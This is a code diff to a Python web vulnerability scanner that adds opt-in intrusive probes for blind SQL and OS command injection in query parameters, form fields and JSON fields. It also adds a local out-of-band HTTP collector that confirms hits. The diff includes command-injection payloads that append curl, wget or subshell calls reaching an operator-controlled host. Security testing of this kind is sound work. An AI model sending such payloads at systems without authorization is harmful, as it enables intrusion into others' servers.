@@ -24,6 +24,7 @@ from __future__ import annotations
 import base64
 import difflib
 import http.cookiejar
+import http.server
 import ipaddress
 import json
 import os
@@ -32,6 +33,7 @@ import secrets
 import socket
 import ssl
 import sys
+import threading
 import time
 import urllib.error
 import urllib.parse
@@ -217,7 +219,8 @@ def crawl_web(
             if not _is_allowed_origin(endpoint, allowed):
                 continue
             ep_opener, ep_headers = request_identity(endpoint)
-            collected.extend(json_active_probe(endpoint, body, ep_opener, ep_headers, timeout, target, method=method))
+            collected.extend(json_active_probe(endpoint, body, ep_opener, ep_headers, timeout, target, method=method,
+                                               intrusive=intrusive, oob_host=oob_host, oob_confirmed=oob_confirmed))
 
     while (
         queue
@@ -311,7 +314,8 @@ def crawl_web(
         if active and body:
             # Opt-in active verification of this page's form fields (GET/POST).
             collected.extend(form_active_probe(final_url, body, page_opener, page_headers, timeout, target,
-                                               allowed_origins=allowed, request_identity=request_identity))
+                                               allowed_origins=allowed, request_identity=request_identity,
+                                               intrusive=intrusive, oob_host=oob_host, oob_confirmed=oob_confirmed))
         if (compare_unauth or secondary_headers) and not _is_static_asset(final_url):
             # Access-control comparison: does a lower-privileged context get the
             # same authenticated content? (IDOR/BOLA/BFLA heuristic.)
@@ -1978,12 +1982,113 @@ _CMD_TIME_PAYLOADS = (
 )
 
 
-def _elapsed(opener: urllib.request.OpenerDirector, url: str, headers: Mapping[str, str], timeout: float) -> float | None:
-    """Wall-clock seconds for one probe GET, or None if the request failed."""
+def _time_call(send: Callable[[], object | None]) -> float | None:
+    """Wall-clock seconds for one request, or None if it failed (``send`` returns None)."""
     start = time.monotonic()
-    if _probe_body(opener, url, headers, timeout) is None:
+    if send() is None:
         return None
     return time.monotonic() - start
+
+
+def _blind_timing_findings(
+    url: str, target: str, label: str,
+    elapsed_for: Callable[[str], float | None], original: str, timeout: float,
+) -> list[Finding]:
+    """Time-based blind SQL injection + OS command injection for one injection point.
+
+    ``elapsed_for(value)`` sends ``value`` at the point and returns the response
+    time. Shared by query-param, form-field and JSON-field probes. SQL payloads
+    replace the value; command payloads append to the original so surrounding
+    syntax still parses. ponytail: stops at the first confirmed family per point.
+    """
+    big = min(6, max(3, int(timeout) - 2))
+    small = max(1, big // 3)
+    out: list[Finding] = []
+    for tmpl in _SQL_TIME_PAYLOADS:
+        if _delay_confirms(lambda s, t=tmpl: elapsed_for(t.format(n=s)), big, small):
+            out.append(_finding(
+                "web.sql-injection-time-blind", "high",
+                "Time-based blind SQL injection (response delay tracks an injected sleep)",
+                url, target=target, evidence=f"{label}: response time scaled with an injected SQL sleep",
+                recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
+            ))
+            break
+    for tmpl in _CMD_TIME_PAYLOADS:
+        if _delay_confirms(lambda s, t=tmpl: elapsed_for(original + t.format(n=s)), big, small):
+            out.append(_finding(
+                "web.command-injection-time-blind", "critical",
+                "OS command injection (response delay tracks an injected sleep command)",
+                url, target=target, evidence=f"{label}: response time scaled with an injected shell sleep",
+                recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
+            ))
+            break
+    return out
+
+
+def _oob_cmd_findings(
+    url: str, target: str, label: str,
+    send_value: Callable[[str], object | None], original: str,
+    oob_host: str, oob_confirmed: Callable[[str], bool],
+) -> list[Finding]:
+    """Out-of-band OS command injection: proves blind RCE without a timing race.
+    Token goes in the URL path so a plain HTTP collector (OobCollector) can confirm it."""
+    ptok = secrets.token_hex(6)
+    for tmpl in (f"; curl http://{oob_host}/{ptok}", f"| wget -qO- http://{oob_host}/{ptok}",
+                 f"$(curl http://{oob_host}/{ptok})", f"`curl http://{oob_host}/{ptok}`"):
+        send_value(original + tmpl)
+    if oob_confirmed(ptok):
+        return [_finding(
+            "web.command-injection-oob", "critical",
+            "OS command injection (server made a caller-controlled out-of-band request)",
+            url, target=target, evidence=f"{label}: an injected command reached out to {oob_host}/{ptok}",
+            recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
+        )]
+    return []
+
+
+class OobCollector:
+    """Minimal HTTP out-of-band collector for blind SSRF / RCE confirmation.
+
+    Starts a local listener in a daemon thread; any request whose path or Host
+    header contains a token counts as a hit for that token. The operator passes
+    ``public_host`` — the ``host:port`` the TARGET can reach this listener on, which
+    only the operator knows for their network — and the scanner uses it as
+    ``oob_host``; payloads embed the token in the URL path. Confirmation is instant
+    (blind SSRF fetch / shell curl complete before the probe response returns).
+    ponytail: HTTP + path tokens, instant check. DNS-only SSRF needs external infra,
+    and an async callback would need polling in ``confirmed``.
+    """
+
+    def __init__(self, public_host: str, *, port: int = 0, bind_host: str = "0.0.0.0") -> None:
+        self._hits: set[str] = set()
+        collector = self
+
+        class _Handler(http.server.BaseHTTPRequestHandler):
+            def _record(self) -> None:
+                collector._hits.add(f"{self.headers.get('Host', '')} {self.path}")
+                self.send_response(200)
+                self.end_headers()
+
+            do_GET = do_POST = do_HEAD = _record
+
+            def log_message(self, *args: object) -> None:
+                pass
+
+        self._server = http.server.HTTPServer((bind_host, port), _Handler)
+        self.port = self._server.server_address[1]
+        # Advertise the actually-bound port, so a caller passing just a host (or :0)
+        # still points targets at the real listener.
+        host_only = public_host.rsplit(":", 1)[0] if ":" in public_host else public_host
+        self.public_host = f"{host_only}:{self.port}"
+        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
+        self._thread.start()
+
+    def confirmed(self, token: str) -> bool:
+        return any(token in hit for hit in self._hits)
+
+    def close(self) -> None:
+        self._server.shutdown()
+        self._server.server_close()
 
 
 def _delay_confirms(fetch: Callable[[int], float | None], big: int, small: int) -> bool:
@@ -2127,14 +2232,14 @@ def active_probe(
         # collector. Verified only if the collector later reports a hit for the token.
         if oob_host and oob_confirmed and name.lower() in _SSRF_PARAM_NAMES:
             ptok = secrets.token_hex(6)
-            _probe_body(opener, _with_query_param(parsed, name, f"https://{ptok}.{oob_host}/"), headers, timeout)
+            _probe_body(opener, _with_query_param(parsed, name, f"http://{oob_host}/{ptok}"), headers, timeout)
             if oob_confirmed(ptok):
                 findings.append(
                     _finding(
                         "web.ssrf-oob-verified", "high",
                         "Server fetched a caller-controlled URL (verified blind SSRF)",
                         url, target=target,
-                        evidence=f"param '{name}': the server made an out-of-band request to {ptok}.{oob_host}",
+                        evidence=f"param '{name}': the server made an out-of-band request to {oob_host}/{ptok}",
                         recommendation="Validate and allow-list outbound destinations; block internal/metadata addresses server-side.",
                     )
                 )
@@ -2155,56 +2260,21 @@ def active_probe(
                     )
                 )
 
-        # Intrusive tier: blind detection by response timing. A vulnerable backend
-        # pauses when the payload is injected; the delay is measured, not the data.
+        # Intrusive tier: blind detection by response timing / out-of-band callback.
+        # A vulnerable backend pauses or calls out; the effect is measured, not the data.
         if intrusive:
-            big = min(6, max(3, int(timeout) - 2))
-            small = max(1, big // 3)
-            for tmpl in _SQL_TIME_PAYLOADS:
-                if _delay_confirms(
-                    lambda s, t=tmpl, nm=name: _elapsed(opener, _with_query_param(parsed, nm, t.format(n=s)), headers, timeout),
-                    big, small,
-                ):
-                    findings.append(
-                        _finding(
-                            "web.sql-injection-time-blind", "high",
-                            "Time-based blind SQL injection (response delay tracks an injected sleep)",
-                            url, target=target,
-                            evidence=f"param '{name}': response time scaled with an injected SQL sleep",
-                            recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
-                        )
-                    )
-                    break
-            for tmpl in _CMD_TIME_PAYLOADS:
-                if _delay_confirms(
-                    lambda s, t=tmpl, nm=name, og=original: _elapsed(opener, _with_query_param(parsed, nm, og + t.format(n=s)), headers, timeout),
-                    big, small,
-                ):
-                    findings.append(
-                        _finding(
-                            "web.command-injection-time-blind", "critical",
-                            "OS command injection (response delay tracks an injected sleep command)",
-                            url, target=target,
-                            evidence=f"param '{name}': response time scaled with an injected shell sleep",
-                            recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
-                        )
-                    )
-                    break
-            # Out-of-band command injection: proves blind RCE without a timing race.
+            label = f"param '{name}'"
+            findings.extend(_blind_timing_findings(
+                url, target, label,
+                lambda v, nm=name: _time_call(lambda: _probe_body(opener, _with_query_param(parsed, nm, v), headers, timeout)),
+                original, timeout,
+            ))
             if oob_host and oob_confirmed:
-                ptok = secrets.token_hex(6)
-                for tmpl in (f"; curl http://{ptok}.{oob_host}/", f"| nslookup {ptok}.{oob_host}", f"$(curl http://{ptok}.{oob_host}/)"):
-                    _probe_body(opener, _with_query_param(parsed, name, original + tmpl), headers, timeout)
-                if oob_confirmed(ptok):
-                    findings.append(
-                        _finding(
-                            "web.command-injection-oob", "critical",
-                            "OS command injection (server made a caller-controlled out-of-band request)",
-                            url, target=target,
-                            evidence=f"param '{name}': an injected command reached out to {ptok}.{oob_host}",
-                            recommendation="Never pass user input to a shell; use argument arrays / safe APIs and validate against an allow-list.",
-                        )
-                    )
+                findings.extend(_oob_cmd_findings(
+                    url, target, label,
+                    lambda v, nm=name: _probe_body(opener, _with_query_param(parsed, nm, v), headers, timeout),
+                    original, oob_host, oob_confirmed,
+                ))
 
     # Injection via request headers (reflected XSS / SSTI). One set per URL, not
     # per param, to cap noise: some apps echo Referer / X-Forwarded-For into the page.
@@ -2276,10 +2346,14 @@ def form_active_probe(
     max_fields: int = 10,
     allowed_origins: set[str] | None = None,
     request_identity: Callable[[str], tuple[urllib.request.OpenerDirector, dict[str, str]]] | None = None,
+    intrusive: bool = False,
+    oob_host: str | None = None,
+    oob_confirmed: Callable[[str], bool] | None = None,
 ) -> list[Finding]:
     """Active verification of HTML form fields (GET and POST), mirroring the
     query-param checks. Skips login/register (password) and file-upload forms to
-    avoid credential submission and uploads. Opt-in, capped, non-destructive-ish."""
+    avoid credential submission and uploads. Opt-in, capped, non-destructive-ish.
+    With ``intrusive``, adds time-based blind SQLi / command injection per field."""
 
     text = body.decode("utf-8", "replace") if isinstance(body, bytes) else body
     parser = _FormsParser()
@@ -2346,6 +2420,21 @@ def form_active_probe(
                             recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
                         )
                     )
+            if intrusive:
+                label = f"form field '{name}' ({method.upper()})"
+                # Bind per-form loop vars as defaults (synchronous use, but keeps the
+                # closures explicit and lint-clean).
+                def submit_field(v, nm=name, ao=action_opener, au=action_url, m=method, b=base, ah=action_headers):
+                    return _submit_form(ao, au, m, {**b, nm: v}, ah, timeout)
+                findings.extend(_blind_timing_findings(
+                    action_url, target, label,
+                    lambda v: _time_call(lambda: submit_field(v)),
+                    base[name], timeout,
+                ))
+                if oob_host and oob_confirmed:
+                    findings.extend(_oob_cmd_findings(
+                        action_url, target, label, submit_field, base[name], oob_host, oob_confirmed,
+                    ))
     return findings
 
 
@@ -2359,13 +2448,17 @@ def json_active_probe(
     *,
     method: str = "POST",
     max_fields: int = 10,
+    intrusive: bool = False,
+    oob_host: str | None = None,
+    oob_confirmed: Callable[[str], bool] | None = None,
 ) -> list[Finding]:
     """Fuzz the string fields of a JSON request body for reflected XSS, SSTI and
     error-based SQL injection — the API analogue of ``form_active_probe``.
 
     ``template`` is an example body (e.g. an OpenAPI ``requestBody`` skeleton); only
     its top-level string values are mutated. Bounded and non-destructive-ish; opt-in
-    and authorization-gated by the caller. ponytail: top-level strings only, nest a
+    and authorization-gated by the caller. With ``intrusive``, adds time-based blind
+    SQLi / command injection per field. ponytail: top-level strings only, nest a
     recursive walk if deeply nested bodies turn out to matter.
     """
 
@@ -2411,6 +2504,19 @@ def json_active_probe(
                         recommendation="Use parameterized queries / prepared statements; never build SQL from raw input.",
                     )
                 )
+        if intrusive:
+            label = f"JSON field '{name}' ({method})"
+            findings.extend(_blind_timing_findings(
+                url, target, label,
+                lambda v, nm=name: _time_call(lambda: _submit_json(opener, url, method, {**template, nm: v}, headers, timeout)),
+                str(template[name]), timeout,
+            ))
+            if oob_host and oob_confirmed:
+                findings.extend(_oob_cmd_findings(
+                    url, target, label,
+                    lambda v, nm=name: _submit_json(opener, url, method, {**template, nm: v}, headers, timeout),
+                    str(template[name]), oob_host, oob_confirmed,
+                ))
     return findings
 
 
